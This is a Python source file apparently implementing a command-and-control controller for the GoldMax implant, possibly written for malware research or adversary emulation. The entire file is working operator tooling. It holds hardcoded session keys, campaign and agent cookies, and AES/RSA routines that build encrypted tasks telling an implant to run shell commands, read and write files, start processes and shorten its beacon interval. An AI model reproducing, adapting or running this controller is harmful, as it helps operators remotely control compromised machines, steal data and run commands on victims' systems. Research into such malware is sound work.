import base64
import ctypes
from random import Random, randbytes, randint
from struct import pack

# 4D356F584146706Ah


class GoldMax:

    def __init__(self):
        self.shared_secret = b"\x6A\x70\x46\x41\x58\x6F\x35\x4D"
        self.session_key = b"Dont_Forget_To_Encrypt_Please!!!"
        self.control_cookie = "48WxLONKwJEo="
        self.state = {
            "Authenticate": self.control_cookie + "wGMEvMwBW77HDj",
            "KeyExchange": self.control_cookie + "ndB3gbMjL",
            "Ready": [';'],
            "AgentId": "XCghVFFHyAYREhsB=",
            "Campaign": "i19TotqC9iD8Y0B7jcGnpp5hYcyjg4cL"
        }
        self.commands = {
            "Idle": "",
            "Execute": "FqTAHlC75Mco",
            "Start": "5qsYl5tTX9yifzLmlWaPDlcI9",
            "Read": "zSEcqn6aeCSGXyc95ZKdzSO ",
            "Update": "mvQM4FwuKbaC",
            "Write": {"Cmd": "",
                      "Wget": self.control_cookie + "",
                      "CleanFile": self.control_cookie + "",
                      "DestinationFile": "",
                      },
        }

    @staticmethod
    def custom_base64_encode(blob):
        """
        Used to encode RSA key
        """
        custom_alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        standard_base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

        # Add Padding -- The padding is stripped so this is needed or else it will fail
        if not isinstance(blob, bytes):
            blob = blob.encode()

        encoded = base64.b64encode(blob, altchars=b'-_')
        encoded = encoded.strip(b'=')

        return encoded

    @staticmethod
    def custom_base64_decode(encoded_blob):
        """
        Used to decode custom base64 implementation
        """
        custom_alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
        standard_base = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

        if isinstance(encoded_blob, bytes):
            encoded_blob = encoded_blob.decode()
        # Add Padding -- The padding is stripped so this is needed or else it will fail
        decoded = base64.b64decode(encoded_blob + "===", altchars='-_')

        return decoded

    @staticmethod
    def aes_encrypt_cfb(plaintext: bytes, key: bytes):
        """
        plaintext: bytes: Message to be encrypted
        key:       bytes: AES Encryption key (32 bytes)
        iv:        bytes: AES IV (16 bytes)
        """
        lib = ctypes.cdll.LoadLibrary("./toolbox/GoldenCrypto.so")

        # AES imports
        aes_encrypt = lib.encrypt_AES_CFB
        aes_encrypt.argtypes = [ctypes.c_char_p]
        aes_encrypt.restype = ctypes.c_void_p
        free = lib.free
        free.argtypes = [ctypes.c_void_p]

        if len(key) != 32:
            print("Invalid Key! Must be 32 bytes!")
            return ""
        # Verify we got a good payload
        ptr = aes_encrypt(plaintext, key)

        cipher_text = ctypes.string_at(ptr)

        free(ptr)

        return cipher_text

    @staticmethod
    def aes_decrypt_cfb(ciphertext: bytes, key: bytes):
        """
        plaintext: bytes: Message to be decrypted
        key:       bytes: AES Encryption key (32 bytes)
        iv:        bytes: AES IV (16 bytes)
        """
        lib = ctypes.cdll.LoadLibrary("./toolbox/GoldenCrypto.so")
        aes_decrypt = lib.decrypt_AES_CFB
        aes_decrypt.argtypes = [ctypes.c_char_p]
        aes_decrypt.restype = ctypes.c_void_p
        free = lib.free
        free.argtypes = [ctypes.c_void_p]

        if len(key) != 32:
            print("Invalid Key! Must be 32 bytes!")
            return ""

        ptr = aes_decrypt(ciphertext, len(ciphertext), key)

        decrypted = ctypes.string_at(ptr)

        free(ptr)

        return decrypted

    @staticmethod
    def rsa_encrypt_oaep(plaintext: bytes):
        """
        Utilizes the RSA OAEP padding scheme
        Performs encryption using Golang to generate Public Key from Private (extracted from sample)
        """

        lib = ctypes.cdll.LoadLibrary("./toolbox/GoldenCrypto.so")
        # RSA imports
        rsa_encrypt = lib.encrypt_RSA_OAEP
        rsa_encrypt.argtypes = [ctypes.c_char_p]
        rsa_encrypt.restype = ctypes.c_void_p
        free = lib.free
        free.argtypes = [ctypes.c_void_p]

        while True:
            ptr = rsa_encrypt(plaintext)

            encrypted = ctypes.string_at(ptr)

            free(ptr)
            if len(encrypted) >= 100:
                break

        return encrypted

    @staticmethod
    def rsa_decrypt_oaep(ciphertext: bytes):
        """
        Utilizes the extracted private key for decryption
        """
        lib = ctypes.cdll.LoadLibrary("./toolbox/GoldenCrypto.so")
        rsa_decrypt = lib.decrypt_RSA_OAEP
        rsa_decrypt.argtypes = [ctypes.c_char_p]
        free = lib.free
        

        print("About to decrypt..")
        ptr = rsa_decrypt(ciphertext)
        print("After decrypt")
        decrypted = ctypes.string_at(ptr)
        
        free(ptr)

        return decrypted

    def get_session_key(self):
        """
        Return Session encrypted with RSA key
        """
        while True:
            encrypted_session_token = self.rsa_encrypt_oaep(self.session_key)

            # Sometimes the size is less than 256 which the implant will throw away
            if len(encrypted_session_token) == 256:
                encoded_token = base64.b64encode(encrypted_session_token)
                return encoded_token

    def exec_shell(self, cmd_data):
        """
                Handle sending and receiving data for exec_shell command (cmd /c)
                """
        cmd = b''
        cmd_to_send = b''

        # Multiple arguments needed for command
        if len(cmd_data) >= 3:
            args = cmd_data[1:]
            for arg in args:
                cmd += arg.encode() + b' '
        else:
            cmd += cmd_data[1].encode()

        while len(cmd) % 16 != 0:
            cmd += b'\x20'

        # Add padding
        cmd += b'\x42' * 16 + b'\x20' * 16

        ciphertext = self.aes_encrypt_cfb(cmd, self.session_key)

        final_cmd = ciphertext

        encoded_cmd = base64.b64encode(self.custom_base64_encode(final_cmd))

        """
        >>> ciph= g.aes_encrypt_cfb(b'\x42' * 16 + b'ipconfig /all   '+ b'\x20'*16, aes_key)

        >>> len(ciph)
        64

        >>> base64.b64encode(g.custom_base64_encode(ciph))
        b'NVMxdnd0WGxlTjlFNlVmUkIxTzNvSHhrSkNyQ0VKRXEzLXJGbTY1b21DQXJFbWhaTG9oWWRfRFlUZThXcE5CNndNYngzcWptRlo3UkpaUmI4enBWeFE='

        HOT DANG FINALLY...  AGAIN..

        >>> ciph= g.aes_encrypt_cfb(b'ipconfig /all   '+ b'\x42'*16+ b'\x20'*16, aes_key)

        >>> len(ciph)
        64

        >>> base64.b64encode(g.custom_base64_encode(ciph))
        b'SDZSX2hGMjBYX3BoRU9LTU00NXZNM1d2ckl6SENCSFc4NmRSbnBZcExhWXZQODFZQXNIOEt0ekZVNXU1eXo0R3VERVptWjVOX3hLUldCSjRQLUZNWVE='

        """

        return encoded_cmd

    def start_process(self, cmd_data):
        file_name = b'5qsYl5tTX9yifzLmlWaPDlcI9 ' + cmd_data[1].encode()

        # Build padding
        while len(file_name) % 16 != 0:
            file_name += b'\x20'

        # Add padding

        file_name += b'\x42' * 16 + b'\x20' * 16

        print('Starting Process', file_name)
        while True:

            ciphertext = self.aes_encrypt_cfb(file_name, self.session_key)

            encoded_cmd = base64.b64encode(self.custom_base64_encode(ciphertext))
            if len(ciphertext) >= len(file_name):
                return encoded_cmd

    def update_config(self, cmd_data):

        # This will make the beacon interval change from 12-16 seconds to 3-3.5 mins
        update = b'\x7C' + b'lJVG2jnYvnE' + b'\x7C' + b'300'

        # Add padding
        update += b'\x42' * 16 + b'\x43' * 15 + b'\x20'

        while True:

            ciphertext = self.aes_encrypt_cfb(update, self.session_key)
            encoded_cmd = base64.b64encode(self.custom_base64_encode(ciphertext))

            if len(ciphertext) >= len(update):
                return encoded_cmd

    def write_file(self, cmd_data):
        """
        write_file = 'BAFsekJMzE'
        Expects: '<>|file_name'
        return: bytes: encoded_cmd
        """
        cmd_to_send = b''
        file_name = b'<>' + b'\x7C' + cmd_data[1].encode() + b'\x7C'
        # Build padding
        while len(file_name) % 16 != 0:
            file_name += b'\x20'

        # Add padding
        file_name += b'\x42' * 16 + b'\x43' * 15 + b'\x20'

        print('FileName', file_name)
        while True:

            ciphertext = self.aes_encrypt_cfb(file_name, self.session_key)

            encoded_cmd = base64.b64encode(self.custom_base64_encode(ciphertext))
            if len(ciphertext) >= len(file_name):
                return encoded_cmd

    def read_file(self, cmd_data):
        """
        Similar format to write file, except it does not start with '<>'
        read_file = 'BAFsekJMzE'
        """
        cmd_to_send = b''
        file_name = b'zSEcqn6aeCSGXyc95ZKdzSO ' + cmd_data[1].encode()

        # Build padding
        while len(file_name) % 16 != 0:
            file_name += b'\x20'

        # Add padding

        file_name += b'\x42' * 16 + b'\x20' * 16

        while True:

            ciphertext = self.aes_encrypt_cfb(file_name, self.session_key)

            encoded_cmd = base64.b64encode(self.custom_base64_encode(ciphertext))
            if len(ciphertext) >= len(file_name):
                return encoded_cmd

    def build_cookie(self, cmd, agent):
        """
        Build the appropriate HTTP Headers for command being sent
        """
        cookie = ''

        if cmd == 'Idle':
            # Agent
            cookie += self.state['AgentId'] + agent + '; '

            # Campaign
            cookie += self.state['Campaign'] + '; '

            return cookie

        elif cmd == 'Write':
            # Command
            cookie += self.control_cookie + self.commands[cmd]['Cmd'] + '; '
            # File
            cookie += self.commands[cmd]['DestinationFile'] + 'DropGold.txt'
            return cookie

        elif cmd == 'Clean':
            # Command
            cookie += self.control_cookie + self.commands['Write']['CleanFile'] + '; '
            # File
            cookie += self.commands['Write']['DestinationFile'] + 'DropGold.txt'
            return cookie

        # Agent
        cookie += self.state['AgentId'] + agent + '; '

        # Command
        cookie += self.control_cookie + self.commands[cmd] + '; '

        # Campaign
        cookie += self.state['Campaign'] + '; '

        return cookie

    def build_cmd(self, cmd_data: bytes, agent):
        """
        Verify multiple of 16 for AES encryption
        command_format = (16 byte command + 32 bytes of padding)
        final_command = base64(custombase64 (command_format))
        """
        encoded_cmd = b''
        cmd_to_send = b''
        print(cmd_data)
        cmd_type = cmd_data[0]

        if cmd_type == 'Execute':
            encoded_cmd = self.exec_shell(cmd_data)

        elif cmd_type == 'Read':
            encoded_cmd = self.read_file(cmd_data)

        elif cmd_type == 'Write':
            encoded_cmd = self.write_file(cmd_data)

        elif cmd_type == 'Start':
            encoded_cmd = self.start_process(cmd_data)

        elif cmd_type == 'Update':
            encoded_cmd = self.update_config(cmd_data)

        # Job ID
        cmd_to_send = b'\x41' * 100
        cmd_to_send += b'\x2A'
        cmd_to_send += encoded_cmd
        cmd_to_send += b'\x2A'
        cmd_to_send += b'\x42' * 100

        new_cookie = self.build_cookie(cmd_type, agent)

        return new_cookie, cmd_to_send
